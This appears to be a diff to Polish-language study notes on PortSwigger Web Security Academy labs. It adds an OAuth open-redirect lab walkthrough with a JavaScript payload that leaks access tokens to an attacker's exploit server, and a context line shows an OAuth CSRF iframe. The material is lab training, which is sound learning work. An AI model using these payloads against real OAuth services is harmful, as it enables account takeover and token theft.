@@ -16,6 +16,8 @@ Payload:
 </stockCheck>
 ```
 
+# File upload
+
 ## Lab: Web shell upload via extension blacklist bypass
 1. W serwerach Apache istnieją pliki `.htaccess`, które opisują konfigurację dla folderu, w którym się znajdują i sub-folderów.
 2. Jeżeli możemy przesłać taki plik (i Apache jest podatne), to możemy opisać, np. w jaki sposób mają być interpretowane pliki z danym rozszerzeniem.
@@ -632,6 +634,24 @@ param=bad-stuff-here
 <iframe src="https://YOUR-LAB-OAUTH-SERVER-ID.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net&response_type=code&scope=openid%20profile%20email"></iframe>
 ```
 8. Przechodzimy przez qproces logowania i w momencie zapytanie z `/oauth-callback` podmieniamy tokeny
+
+## Lab: Stealing OAuth access tokens via an open redirect
+1. Znajdujemy miejsce z redirectem
+2. Okazuje się, że sprawdzane jest tylko czy początek linku jest dokładnie taki jaki ma być
+3. Możemy zatem z pomocą path traversal `../` przekierować go na inną podstronę w tej domenie
+4. Przekierowujemy na `/post/next?path=`, który z kolei przekierowuje na podaną stronę (już dowolną)
+5. Niestety dodawane informacje, których potzrzbujemy są za znakiem `#`, a zatem nie zapiszą się w logach serwera
+6. Musimy zatem skonstruować skrypt, który najpierw wyśle zapytanie do oauth, któte przekierowane zosatnie na nasz serwer, a następnie serwer zczyta co jest po znaku hash i wykona kolejne zapytanie z tym parametrem.
+```
+<script>
+    if (!document.location.hash) {
+        window.location = 'https://oauth-0a930074048a7ca5c028216602a40079.web-security-academy.net/auth?client_id=rl0ntdjn6bqcnz7xs70sj&redirect_uri=https://0a26001304507c97c09221c800690068.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ac900f304657c41c078211801e000bf.web-security-academy.net/exploit&response_type=token&nonce=-576275628&scope=openid%20profile%20email'
+    } else {
+        window.location = '/?' + document.location.hash.substr(1)
+    }
+</script>
+```
+7. Znaleziony klucz podmieniamy w czasie logowania i dostajemy klucz do API.
 
 
 # JWT
